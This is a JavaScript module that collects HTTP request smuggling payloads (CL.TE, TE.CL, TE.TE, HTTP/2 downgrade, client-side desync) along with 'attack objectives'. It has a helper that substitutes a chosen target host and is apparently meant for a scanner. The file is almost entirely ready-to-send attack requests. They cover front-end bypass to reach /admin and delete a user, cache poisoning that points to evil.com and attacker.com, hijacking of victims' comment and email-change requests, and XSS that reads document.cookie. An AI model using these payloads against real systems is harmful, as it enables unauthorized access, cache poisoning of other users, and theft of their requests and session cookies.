// HTTP Request Smuggling Payloads
// CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade attacks

const SmugglingPayloads = {
    // CL.TE - Front-end uses Content-Length, Back-end uses Transfer-Encoding
    clte: [
        {
            name: 'CL.TE Basic',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
SMUGGLED`,
            description: 'Basic CL.TE desync attack'
        },
        {
            name: 'CL.TE Admin Access',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 54\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
\r
`,
            description: 'Access admin panel via CL.TE'
        },
        {
            name: 'CL.TE Cache Poison',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 130\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /static/include.js HTTP/1.1\r
Host: evil.com\r
Foo: x`,
            description: 'Poison web cache'
        }
    ],

    // TE.CL - Front-end uses Transfer-Encoding, Back-end uses Content-Length
    tecl: [
        {
            name: 'TE.CL Basic',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 3\r
Transfer-Encoding: chunked\r
\r
8\r
SMUGGLED\r
0\r
\r
`,
            description: 'Basic TE.CL desync attack'
        },
        {
            name: 'TE.CL Admin Access',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5c\r
GET /admin HTTP/1.1\r
Host: TARGET\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
`,
            description: 'Access admin via TE.CL'
        },
        {
            name: 'TE.CL Request Hijack',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
96\r
POST /comment HTTP/1.1\r
Host: TARGET\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 400\r
\r
comment=\r
0\r
\r
`,
            description: 'Hijack victim requests'
        }
    ],

    // TE.TE - Both use TE but one can be obfuscated
    tete: [
        {
            name: 'TE.TE Space Obfuscation',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Transfer-Encoding: chunked\r
Transfer-Encoding: x\r
\r
5\r
SMUGGLED\r
0\r
\r
`,
            description: 'Obfuscate TE with invalid value'
        },
        {
            name: 'TE.TE Tab Character',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Transfer-Encoding: chunked\r
Transfer-Encoding:\tchunked\r
\r
5\r
SMUGGLED\r
0\r
\r
`,
            description: 'Tab character obfuscation'
        },
        {
            name: 'TE.TE Newline',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Transfer-Encoding: chunked\r
Transfer-Encoding\r
 : chunked\r
\r
5\r
SMUGGLED\r
0\r
\r
`,
            description: 'Newline obfuscation'
        }
    ],

    // HTTP/2 Downgrade Attacks
    http2Downgrade: [
        {
            name: 'H2.CL Request Smuggling',
            request: `:method: POST\r
:path: /\r
:authority: TARGET\r
content-length: 0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
\r
`,
            description: 'HTTP/2 to HTTP/1.1 CL desync'
        },
        {
            name: 'H2.TE Request Smuggling',
            request: `:method: POST\r
:path: /\r
:authority: TARGET\r
transfer-encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
\r
`,
            description: 'HTTP/2 to HTTP/1.1 TE desync'
        }
    ],

    // Client-Side Desync (CSD)
    clientSideDesync: [
        {
            name: 'CSD via CL Mismatch',
            request: `GET / HTTP/1.1\r
Host: TARGET\r
Content-Length: 35\r
\r
GET /hopefully404 HTTP/1.1\r
Foo: x`,
            description: 'Client-side desync attack'
        }
    ],

    // Pause-Based Detection
    pauseBased: [
        {
            name: 'Pause-Based CL.TE',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Connection: keep-alive\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
X`,
            description: 'Timing-based CL.TE detection'
        },
        {
            name: 'Pause-Based TE.CL',
            request: `POST / HTTP/1.1\r
Host: TARGET\r
Connection: keep-alive\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
1\r
Z\r
Q`,
            description: 'Timing-based TE.CL detection'
        }
    ]
};

// Attack objectives and their payloads
const AttackObjectives = {
    bypassSecurity: {
        name: 'Bypass Front-end Security',
        payloads: [
            `GET /admin HTTP/1.1\r
Host: localhost\r
\r
`,
            `POST /admin/delete HTTP/1.1\r
Host: localhost\r
Content-Length: 10\r
\r
user=carlos`
        ]
    },

    poisonCache: {
        name: 'Web Cache Poisoning',
        payloads: [
            `GET /static/include.js HTTP/1.1\r
Host: evil.com\r
\r
`,
            `GET /resources/js/tracking.js HTTP/1.1\r
Host: attacker.com\r
\r
`
        ]
    },

    hijackRequests: {
        name: 'Request Hijacking',
        payloads: [
            `POST /comment HTTP/1.1\r
Host: TARGET\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 400\r
\r
comment=`,
            `POST /my-account/change-email HTTP/1.1\r
Host: TARGET\r
Content-Length: 400\r
\r
email=`
        ]
    },

    xssDelivery: {
        name: 'XSS Delivery',
        payloads: [
            `GET /?search=<script>alert(1)</script> HTTP/1.1\r
Host: TARGET\r
\r
`,
            `POST /comment HTTP/1.1\r
Host: TARGET\r
Content-Length: 100\r
\r
comment=<script>alert(document.cookie)</script>`
        ]
    }
};

// Helper functions
function getTechniquePayloads(technique) {
    return SmugglingPayloads[technique] || [];
}

function getAllSmugglingPayloads() {
    const allPayloads = [];
    Object.keys(SmugglingPayloads).forEach(key => {
        if (Array.isArray(SmugglingPayloads[key])) {
            allPayloads.push(...SmugglingPayloads[key]);
        }
    });
    return allPayloads;
}

function getTechniqueCount() {
    let count = 0;
    Object.keys(SmugglingPayloads).forEach(key => {
        if (Array.isArray(SmugglingPayloads[key])) {
            count += SmugglingPayloads[key].length;
        }
    });
    return count;
}

function buildSmugglingRequest(template, targetHost) {
    return template.replace(/TARGET/g, targetHost);
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        SmugglingPayloads,
        AttackObjectives,
        getTechniquePayloads,
        getAllSmugglingPayloads,
        getTechniqueCount,
        buildSmugglingRequest
    };
}
